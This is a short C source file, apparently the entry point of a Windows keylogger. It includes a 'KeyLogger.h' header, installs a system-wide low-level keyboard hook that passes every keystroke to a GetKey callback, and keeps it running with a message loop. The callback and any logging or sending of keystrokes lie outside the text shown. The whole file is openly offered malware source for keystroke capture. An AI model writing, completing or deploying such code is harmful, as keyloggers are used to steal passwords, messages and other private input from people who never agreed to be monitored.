#include "KeyLogger.h"
 
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow){
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)GetKey, GetModuleHandle(NULL), 0);
    MSG msg;
    
    while(GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hKeyHook);
    return 0;
}
